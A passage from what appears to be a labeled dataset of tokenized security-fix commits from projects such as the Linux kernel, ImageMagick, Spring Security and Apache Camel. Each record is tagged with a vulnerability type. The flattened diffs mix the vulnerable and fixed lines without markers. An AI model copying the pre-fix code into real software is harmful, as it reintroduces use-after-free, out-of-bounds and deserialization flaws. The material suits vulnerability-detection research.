"following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", "information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["[PATCH]", "xacct_add_tsk:", "fix", "pure", "theoretical", "->mm", "use-after-free", "Paranoid", "fix.", "The", "task", "can", "free", "its", "->mm", "after", "the", "'if", "(p->mm)'", "check.", "Signed-off-by:", "Oleg", "Nesterov", "<oleg@tv-sign.ru>", "Cc:", "Shailabh", "Nagar", "<nagar@watson.ibm.com>", "Cc:", "Balbir", "Singh", "<balbir@in.ibm.com>", "Cc:", "Jay", "Lan", "<jlan@sgi.com>", "Signed-off-by:", "Andrew", "Morton", "<akpm@osdl.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["@", "@", "-", "80", ",", "13", "+", "80", ",", "17", "@", "@", "void", "bacct_add_tsk", "(", "struct", "taskstats", "*", "stats", ",", "struct", "task_struct", "*", "tsk", ")", "*", "/", "void", "xacct_add_tsk", "(", "struct", "taskstats", "*", "stats", ",", "struct", "task_struct", "*", "p", ")", "{", "struct", "mm_struct", "*", "mm", ";", "/", "*", "convert", "pages", "-", "jiffies", "to", "Mbyte", "-", "usec", "*", "/", "stats", "-", ">", "coremem", "=", "jiffies_to_usecs", "(", "p", "-", ">", "acct_rss_mem1", ")", "*", "PAGE_SIZE", "/", "MB", ";", "stats", "-", ">", "virtmem", "=", "jiffies_to_usecs", "(", "p", "-", ">", "acct_vm_mem1", ")", "*", "PAGE_SIZE", "/", "MB", ";", "if", "(", "p", "-", ">", "mm", ")", "{", "mm", "=", "get_task_mm", "(", "p", ")", ";", "if", "(", "mm", ")", "{", "/", "*", "adjust", "to", "KB", "unit", "*", "/", "stats", "-", ">", "hiwater_rss", "=", "p", "-", ">", "mm", "-", ">", "hiwater_rss", "*", "PAGE_SIZE", "/", "KB", ";", "stats", "-", ">", "hiwater_vm", "=", "p", "-", ">", "mm", "-", ">", "hiwater_vm", "*", "PAGE_SIZE", "/", "KB", ";", "stats", "-", ">", "hiwater_rss", "=", "mm", "-", ">", "hiwater_rss", "*", "PAGE_SIZE", "/", "KB", ";", "stats", "-", ">", "hiwater_vm", "=", "mm", "-", ">", "hiwater_vm", "*", "PAGE_SIZE", "/", "KB", ";", "mmput", "(", "mm", ")", ";", "}", "stats", "-", ">", "read_char", "=", "p", "-", ">", "rchar", ";", "stats", "-", ">", "write_char", "=", "p", "-", ">", "wchar", ";"], "docstring_tokens": ["use-after-free", "error"]}
{"contents": ["ipv4:", "additional", "update", "of", "dev_net(dev)", "to", "struct", "*net", "in", "ip_fragment.c,", "NULL", "ptr", "OOPS", "ipv4", "ip_frag_reasm(),", "fully", "replace", "'dev_net(dev)'", "with", "'net',", "defined", "previously", "patched", "into", "2.6.29.", "Between", "2.6.28.10", "and", "2.6.29,", "net/ipv4/ip_fragment.c", "was", "patched,", "changing", "from", "dev_net(dev)", "to", "container_of(...).", "Unfortunately", "the", "goto", "section", "(out_fail)", "on", "oversized", "packets", "inside", "ip_frag_reasm()", "didn't", "get", "touched", "up", "as", "well.", "Oversized", "IP", "packets", "cause", "a", "NULL", "pointer", "dereference", "and", "immediate", "hang.", "I", "discovered", "this", "running", "openvasd", "and", "my", "previous", "email", "on", "this", "is", "titled:", "NULL", "pointer", "dereference", "at", "2.6.32-rc8:net/ipv4/ip_fragment.c:566", "Signed-off-by:", "David", "Ford", "<david@blue-labs.org>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "563", ",", "7", "+", "563", ",", "7", "@", "@", "static", "int", "ip_frag_reasm", "(", "struct", "ipq", "*", "qp", ",", "struct", "sk_buff", "*", "prev", ",", "printk", "(", "KERN_INFO", "\"", "Oversized", "IP", "packet", "from", "%", "pI4", ".", "\\", "n", "\"", ",", "&", "qp", "-", ">", "saddr", ")", ";", "out_fail", ":", "IP_INC_STATS_BH", "(", "dev_net", "(", "dev", ")", ",", "IPSTATS_MIB_REASMFAILS", ")", ";", "IP_INC_STATS_BH", "(", "net", ",", "IPSTATS_MIB_REASMFAILS", ")", ";", "return", "err", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["btrfs:", "relocation:", "Only", "remove", "reloc", "rb_trees", "if", "reloc", "control", "has", "been", "initialized", "Invalid", "reloc", "tree", "can", "cause", "kernel", "NULL", "pointer", "dereference", "when", "btrfs", "does", "some", "cleanup", "of", "the", "reloc", "roots.", "It", "turns", "out", "that", "fs_info::reloc_ctl", "can", "be", "NULL", "in", "btrfs_recover_relocation()", "as", "we", "allocate", "relocation", "control", "after", "all", "reloc", "roots", "have", "been", "verified.", "So", "when", "we", "hit:", "note,", "we", "haven't", "called", "set_reloc_control()", "thus", "fs_info::reloc_ctl", "is", "still", "NULL.", "Link:", "https://bugzilla.kernel.org/show_bug.cgi?id=199833", "Reported-by:", "Xu", "Wen", "<wen.xu@gatech.edu>", "Signed-off-by:", "Qu", "Wenruo", "<wqu@suse.com>", "Tested-by:", "Gu", "Jinxiang", "<gujx@cn.fujitsu.com>", "Reviewed-by:", "David", "Sterba", "<dsterba@suse.com>", "Signed-off-by:", "David", "Sterba", "<dsterba@suse.com>"], "code_tokens": ["@", "@", "-", "1281", ",", "18", "+", "1281", ",", "19", "@", "@", "static", "void", "__del_reloc_root", "(", "struct", "btrfs_root", "*", "root", ")", "struct", "mapping_node", "*", "node", "=", "NULL", ";", "struct", "reloc_control", "*", "rc", "=", "fs_info", "-", ">", "reloc_ctl", ";", "spin_lock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "rb_node", "=", "tree_search", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ",", "root", "-", ">", "node", "-", ">", "start", ")", ";", "if", "(", "rb_node", ")", "{", "node", "=", "rb_entry", "(", "rb_node", ",", "struct", "mapping_node", ",", "rb_node", ")", ";", "rb_erase", "(", "&", "node", "-", ">", "rb_node", ",", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ")", ";", "if", "(", "rc", ")", "{", "spin_lock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "rb_node", "=", "tree_search", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ",", "root", "-", ">", "node", "-", ">", "start", ")", ";", "if", "(", "rb_node", ")", "{", "node", "=", "rb_entry", "(", "rb_node", ",", "struct", "mapping_node", ",", "rb_node", ")", ";", "rb_erase", "(", "&", "node", "-", ">", "rb_node", ",", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ")", ";", "}", "spin_unlock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "if", "(", "!", "node", ")", "return", ";", "BUG_ON", "(", "(", "struct", "btrfs_root", "*", ")", "node", "-", ">", "data", "!", "=", "root", ")", ";", "}", "spin_unlock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "if", "(", "!", "node", ")", "return", ";", "BUG_ON", "(", "(", "struct", "btrfs_root", "*", ")", "node", "-", ">", "data", "!", "=", "root", ")", ";", "spin_lock", "(", "&", "fs_info", "-", ">", "trans_lock", ")", ";", "list_del_init", "(", "&", "root", "-", ">", "root_list", ")", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Added", "check", "for", "out", "of", "bounds", "read", "(https://github.com/ImageMagick/ImageMagick/issues/108)."], "code_tokens": ["@", "@", "-", "2605", ",", "18", "+", "2605", ",", "23", "@", "@", "static", "void", "RemoveResolutionFromResourceBlock", "(", "StringInfo", "*", "bim_profile", ")", "register", "unsigned", "char", "*", "q", ";", "ssize_t", "cnt", ";", "q", "=", "(", "unsigned", "char", "*", ")", "p", ";", "if", "(", "LocaleNCompare", "(", "(", "const", "char", "*", ")", "p", ",", "\"", "8BIM", "\"", ",", "4", ")", "!", "=", "0", ")", "break", ";", "return", ";", "p", "=", "PushLongPixel", "(", "MSBEndian", ",", "p", ",", "&", "long_sans", ")", ";", "p", "=", "PushShortPixel", "(", "MSBEndian", ",", "p", ",", "&", "id", ")", ";", "p", "=", "PushShortPixel", "(", "MSBEndian", ",", "p", ",", "&", "short_sans", ")", ";", "p", "=", "PushLongPixel", "(", "MSBEndian", ",", "p", ",", "&", "count", ")", ";", "if", "(", "(", "id", "=", "=", "0x000003ed", ")", "&", "&", "(", "PSDQuantum", "(", "count", ")", "<", "(", "ssize_t", ")", "(", "length", "-", "12", ")", "))", "cnt", "=", "PSDQuantum", "(", "count", ")", ";", "if", "(", "cnt", "<", "0", ")", "return", ";", "if", "(", "(", "id", "=", "=", "0x000003ed", ")", "&", "&", "(", "cnt", "<", "(", "ssize_t", ")", "(", "length", "-", "12", ")", "))", "{", "(", "void", ")", "CopyMagickMemory", "(", "q", ",", "q", "+", "PSDQuantum", "(", "count", ")", "+", "12", ",", "length", "(", "PSDQuantum", "(", "count", ")", "+", "12", ")", "-(", "q", "-", "datum", ")", ");", "SetStringInfoLength", "(", "bim_profile", ",", "length", "-", "(", "PSDQuantum", "(", "count", ")", "+", "12", ")", ");", "(", "void", ")", "CopyMagickMemory", "(", "q", ",", "q", "+", "cnt", "+", "12", ",", "length", "-", "(", "cnt", "+", "12", ")", "-(", "q", "-", "datum", ")", ");", "SetStringInfoLength", "(", "bim_profile", ",", "length", "-", "(", "cnt", "+", "12", ")", ");", "break", ";", "}", "p", "+", "=", "count", ";", "@", "@", "-", "2625", ",", "8", "+", "2630", ",", "8", "@", "@", "static", "void", "RemoveResolutionFromResourceBlock", "(", "StringInfo", "*", "bim_profile", ")", "}", "}", "static", "MagickBooleanType", "WritePSDImage", "(", "const", "ImageInfo", "*", "image_info", ",", "Image", "*", "image", ",", "ExceptionInfo", "*", "exception", ")", "static", "MagickBooleanType", "WritePSDImage", "(", "const", "ImageInfo", "*", "image_info", ",", "Image", "*", "image", ",", "ExceptionInfo", "*", "exception", ")", "{", "const", "char", "*", "property", ";"], "docstring_tokens": ["out-of-bounds", "read", "error"]}
{"contents": ["Adding", "flag", "to", "SVG", "universe", "that", "will", "allow", "the", "user", "to", "disable", "loading", "arbitrary", "URIs."], "code_tokens": ["@", "@", "-", "113", ",", "21", "+", "113", ",", "28", "@", "@", "protected", "void", "build", "(", ")", "throws", "SVGException", "{", "if", "(", "getPres", "(", "sty", ".", "setName", "(", "\"", "xlink", ":", "href", "\"", "))", ")", "{", "URI", "src", "=", "sty", ".", "getURIValue", "(", "getXMLBase", "(", "))", ";", "if", "(", "\"", "data", "\"", ".", "equals", "(", "src", ".", "getScheme", "(", "))", ")", "{", "imageSrc", "=", "new", "URL", "(", "null", ",", "src", ".", "toASCIIString", "(", "),", "new", "Handler", "(", "))", ";", "}", "else", "}", "else", "{", "try", "{", "imageSrc", "=", "src", ".", "toURL", "(", ");", "}", "catch", "(", "Exception", "e", ")", "if", "(", "!", "diagram", ".", "getUniverse", "(", ").", "isImageDataInlineOnly", "(", "))", "{", "Logger", ".", "getLogger", "(", "SVGConst", ".", "SVG_LOGGER", ")", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Could", "not", "parse", "xlink", ":", "href", "\"", "+", "src", ",", "e", ")", ";", "/", "/", "e", ".", "printStackTrace", "(", ");", "imageSrc", "=", "null", ";", "try", "{", "imageSrc", "=", "src", ".", "toURL", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "Logger", ".", "getLogger", "(", "SVGConst", ".", "SVG_LOGGER", ")", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Could", "not", "parse", "xlink", ":", "href", "\"", "+", "src", ",", "e", ")", ";", "/", "/", "e", ".", "printStackTrace", "(", ");", "imageSrc", "=", "null", ";", "}", "}", "}", "}", "@", "@", "-", "100", ",", "7", "+", "100", ",", "10", "@", "@", "private", "boolean", "verbose", "=", "false", ";", "/", "/", "Cache", "reader", "for", "efficiency", "XMLReader", "cachedReader", ";", "/", "/", "If", "true", ",", "<", "imageSVG", ">", "elements", "will", "only", "load", "image", "data", "that", "is", "included", "using", "inline", "data", ":", "uris", "private", "boolean", "imageDataInlineOnly", "=", "false", ";", "/", "**", "*", "Creates", "a", "new", "instance", "of", "SVGUniverse", "*", "/", "@", "@", "-", "673", ",", "4", "+", "676", ",", "20", "@", "@", "public", "SVGUniverse", "duplicate", "(", ")", "throws", "IOException", ",", "ClassNotFoundException", "return", "universe", ";", "}", "/", "**", "*", "@", "return", "the", "imageDataInlineOnly", "*", "/", "public", "boolean", "isImageDataInlineOnly", "(", ")", "{", "return", "imageDataInlineOnly", ";", "}", "/", "**", "*", "@", "param", "imageDataInlineOnly", "the", "imageDataInlineOnly", "to", "set", "*", "/", "public", "void", "setImageDataInlineOnly", "(", "boolean", "imageDataInlineOnly", ")", "{", "this", ".", "imageDataInlineOnly", "=", "imageDataInlineOnly", ";", "}", "}"], "docstring_tokens": ["request", "forgery", "(ssrf", ")"]}
{"contents": ["Update", "SecurityJackson2Modules", "Fixes", "gh-4370"], "code_tokens": ["@", "@", "-", "16", ",", "17", "+", "16", ",", "18", "@", "@", "package", "org", ".", "springframework", ".", "security", ".", "jackson2", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JacksonAnnotation", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonTypeInfo", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "Module", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "ObjectMapper", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "jsontype", ".", "TypeResolverBuilder", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "*;", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "cfg", ".", "MapperConfig", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "jsontype", ".", "*;", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "springframework", ".", "core", ".", "annotation", ".", "AnnotationUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "ClassUtils", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "*;", "/", "**", "*", "This", "utility", "class", "will", "find", "all", "the", "SecurityModules", "in", "classpath", ".", "@", "@", "-", "65", ",", "7", "+", "66", ",", "7", "@", "@", "public", "static", "void", "enableDefaultTyping", "(", "ObjectMapper", "mapper", ")", "{", "if", "(", "mapper", "!", "=", "null", ")", "{", "TypeResolverBuilder", "<", "?>", "typeBuilder", "=", "mapper", ".", "getDeserializationConfig", "(", ").", "getDefaultTyper", "(", "null", ")", ";", "if", "(", "typeBuilder", "=", "=", "null", ")", "{", "mapper", ".", "enableDefaultTyping", "(", "ObjectMapper", ".", "DefaultTyping", ".", "NON_FINAL", ",", "JsonTypeInfo", ".", "As", ".", "PROPERTY", ")", ";", "mapper", ".", "setDefaultTyping", "(", "createWhitelistedDefaultTyping", "(", "))", ";", "}", "}", "}", "@", "@", "-", "103", ",", "4", "+", "104", ",", "111", "@", "@", "private", "static", "Module", "loadAndGetInstance", "(", "String", "className", ",", "ClassLoader", "loader", ")", "{", "}", "return", "modules", ";", "}", "/", "**", "*", "Creates", "a", "TypeResolverBuilder", "that", "performs", "whitelisting", ".", "*", "@", "return", "a", "TypeResolverBuilder", "that", "performs", "whitelisting", ".", "*", "/", "private", "static", "TypeResolverBuilder", "<", "?", "extends", "TypeResolverBuilder", ">", "createWhitelistedDefaultTyping", "(", ")", "{", "TypeResolverBuilder", "<", "?", "extends", "TypeResolverBuilder", ">", "result", "=", "new", "WhitelistTypeResolverBuilder", "(", "ObjectMapper", ".", "DefaultTyping", ".", "NON_FINAL", ")", ";", "result", "=", "result", ".", "init", "(", "JsonTypeInfo", ".", "Id", ".", "CLASS", ",", "null", ")", ";", "result", "=", "result", ".", "inclusion", "(", "JsonTypeInfo", ".", "As", ".", "PROPERTY", ")", ";", "return", "result", ";", "}", "/", "**", "*", "An", "implementation", "of", "{", "@", "link", "ObjectMapper", ".", "DefaultTypeResolverBuilder", "}", "that", "overrides", "the", "{", "@", "link", "TypeIdResolver", "}", "*", "with", "{", "@", "link", "WhitelistTypeIdResolver", "}", ".", "*", "@", "author", "Rob", "Winch", "*", "/", "static", "class", "WhitelistTypeResolverBuilder", "extends", "ObjectMapper", ".", "DefaultTypeResolverBuilder", "{", "public", "WhitelistTypeResolverBuilder", "(", "ObjectMapper", ".", "DefaultTyping", "defaultTyping", ")", "{", "super", "(", "defaultTyping", ")", ";", "}", "protected", "TypeIdResolver", "idResolver", "(", "MapperConfig", "<", "?>", "config", ",", "JavaType", "baseType", ",", "Collection", "<", "NamedType", ">", "subtypes", ",", "boolean", "forSer", ",", "boolean", "forDeser", ")", "{", "TypeIdResolver", "result", "=", "super", ".", "idResolver", "(", "config", ",", "baseType", ",", "subtypes", ",", "forSer", ",", "forDeser", ")", ";", "return", "new", "WhitelistTypeIdResolver", "(", "result", ")", ";", "}", "}", "/", "**", "*", "A", "{", "@", "link", "TypeIdResolver", "}", "that", "delegates", "to", "an", "existing", "implementation", "and", "throws", "an", "IllegalStateException", "if", "the", "*", "class", "being", "looked", "up", "is", "not", "whitelisted", ",", "does", "not", "provide", "an", "explicit", "mixin", ",", "and", "is", "not", "annotated", "with", "Jackson", "*", "mappings", ".", "See", "https", ":", "//", "github", ".", "com", "/", "spring", "-", "projects", "/", "spring", "-", "security", "/", "issues", "/", "4370", "*", "/", "static", "class", "WhitelistTypeIdResolver", "implements", "TypeIdResolver", "{", "private", "static", "final", "Set", "<", "String", ">", "WHITELIST_CLASS_NAMES", "=", "Collections", ".", "unmodifiableSet", "(", "new", "HashSet", "(", "Arrays", ".", "asList", "(", "\"", "java", ".", "util", ".", "ArrayList", "\"", ",", "\"", "java", ".", "util", ".", "Collections", "$", "EmptyMap", "\"", ",", "\"", "java", ".", "util", ".", "Date", "\"", ",", "\"", "java", ".", "util", ".", "TreeMap", "\"", ",", "\"", "org", ".", "springframework", ".", "security", ".", "core", ".", "context", ".", "SecurityContextImpl", "\"", ")", "))", ";", "private", "final", "TypeIdResolver", "delegate", ";", "WhitelistTypeIdResolver", "(", "TypeIdResolver", "delegate", ")", "{", "this", ".", "delegate", "=", "delegate", ";", "}", "@", "Override", "public", "void", "init", "(", "JavaType", "baseType", ")", "{", "delegate", ".", "init", "(", "baseType", ")", ";", "}", "@", "Override", "public", "String", "idFromValue", "(", "Object", "value", ")", "{", "return", "delegate", ".", "idFromValue", "(", "value", ")", ";", "}", "@", "Override", "public", "String", "idFromValueAndType", "(", "Object", "value", ",", "Class", "<", "?>", "suggestedType", ")", "{", "return", "delegate", ".", "idFromValueAndType", "(", "value", ",", "suggestedType", ")", ";", "}", "@", "Override", "public", "String", "idFromBaseType", "(", ")", "{", "return", "delegate", ".", "idFromBaseType", "(", ");", "}", "@", "Override", "public", "JavaType", "typeFromId", "(", "DatabindContext", "context", ",", "String", "id", ")", "throws", "IOException", "{", "DeserializationConfig", "config", "=", "(", "DeserializationConfig", ")", "context", ".", "getConfig", "(", ");", "JavaType", "result", "=", "delegate", ".", "typeFromId", "(", "context", ",", "id", ")", ";", "String", "className", "=", "result", ".", "getRawClass", "(", ").", "getName", "(", ");", "if", "(", "isWhitelisted", "(", "className", ")", ")", "{", "return", "delegate", ".", "typeFromId", "(", "context", ",", "id", ")", ";", "}", "boolean", "isExplicitMixin", "=", "config", ".", "findMixInClassFor", "(", "result", ".", "getRawClass", "(", "))", "!", "=", "null", ";", "if", "(", "isExplicitMixin", ")", "{", "return", "result", ";", "}", "JacksonAnnotation", "jacksonAnnotation", "=", "AnnotationUtils", ".", "findAnnotation", "(", "result", ".", "getRawClass", "(", "),", "JacksonAnnotation", ".", "class", ")", ";", "if", "(", "jacksonAnnotation", "!", "=", "null", ")", "{", "return", "result", ";", "}", "throw", "new", "IllegalArgumentException", "(", "\"", "The", "class", "with", "\"", "+", "id", "+", "\"", "and", "name", "of", "\"", "+", "className", "+", "\"", "is", "not", "whitelisted", ".", "\"", "\"", "If", "you", "believe", "this", "class", "is", "safe", "to", "deserialize", ",", "please", "provide", "an", "explicit", "mapping", "using", "Jackson", "annotations", "or", "by", "providing", "a", "Mixin", ".", "\"", "\"", "If", "the", "serialization", "is", "only", "done", "by", "a", "trusted", "source", ",", "you", "can", "also", "enable", "default", "typing", ".", "\"", "\"", "See", "https", ":", "//", "github", ".", "com", "/", "spring", "-", "projects", "/", "spring", "-", "security", "/", "issues", "/", "4370", "for", "details", "\"", ");", "}", "private", "boolean", "isWhitelisted", "(", "String", "id", ")", "{", "return", "WHITELIST_CLASS_NAMES", ".", "contains", "(", "id", ")", ";", "}", "@", "Override", "public", "String", "getDescForKnownTypeIds", "(", ")", "{", "return", "delegate", ".", "getDescForKnownTypeIds", "(", ");", "}", "@", "Override", "public", "JsonTypeInfo", ".", "Id", "getMechanism", "(", ")", "{", "return", "delegate", ".", "getMechanism", "(", ");", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "123", "@", "@", "/", "*", "*", "Copyright", "2015", "-", "2017", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "security", ".", "jackson2", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonAutoDetect", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonIgnoreProperties", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonIgnoreType", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "annotation", ".", "JsonTypeInfo", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "databind", ".", "ObjectMapper", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "java", ".", "lang", ".", "annotation", ".", "*;", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "*;", "/", "**", "*", "@", "author", "Rob", "Winch", "*", "@", "since", "5", ".", "0", "*", "/", "public", "class", "SecurityJackson2ModulesTests", "{", "private", "ObjectMapper", "mapper", ";", "@", "Before", "public", "void", "setup", "(", ")", "{", "mapper", "=", "new", "ObjectMapper", "(", ");", "SecurityJackson2Modules", ".", "enableDefaultTyping", "(", "mapper", ")", ";", "}", "@", "Test", "public", "void", "readValueWhenNotWhitelistedOrMappedThenThrowsException", "(", ")", "throws", "Exception", "{", "String", "content", "=", "\"", "{\\", "\"@", "class", "\\", "\":", "\\\"", "org", ".", "springframework", ".", "security", ".", "jackson2", ".", "SecurityJackson2ModulesTests", "$", "NotWhitelisted", "\\", "\",", "\\\"", "property", "\\", "\":", "\\\"", "bar", "\\", "\"}", "\";", "assertThatThrownBy", "(", "()", "-", ">", "{", "mapper", ".", "readValue", "(", "content", ",", "Object", ".", "class", ")", ";", "}", ")", ".", "hasStackTraceContaining", "(", "\"", "whitelisted", "\"", ");", "}", "@", "Test", "public", "void", "readValueWhenExplicitDefaultTypingAfterSecuritySetupThenReadsAsSpecificType", "(", ")", "throws", "Exception", "{", "mapper", ".", "enableDefaultTyping", "(", "ObjectMapper", ".", "DefaultTyping", ".", "NON_FINAL", ",", "JsonTypeInfo", ".", "As", ".", "PROPERTY", ")", ";", "String", "content", "=", "\"", "{\\", "\"@", "class", "\\", "\":", "\\\"", "org", ".", "springframework", ".", "security", ".", "jackson2", ".", "SecurityJackson2ModulesTests", "$", "NotWhitelisted", "\\", "\",", "\\\"", "property", "\\", "\":", "\\\"", "bar", "\\", "\"}", "\";", "assertThat", "(", "mapper", ".", "readValue", "(", "content", ",", "Object", ".", "class", ")", ").", "isInstanceOf", "(", "NotWhitelisted", ".", "class", ")", ";", "}", "@", "Test", "public", "void", "readValueWhenExplicitDefaultTypingBeforeSecuritySetupThenReadsAsSpecificType", "(", ")", "throws", "Exception", "{", "mapper", "=", "new", "ObjectMapper", "(", ");", "mapper", ".", "enableDefaultTyping", "(", 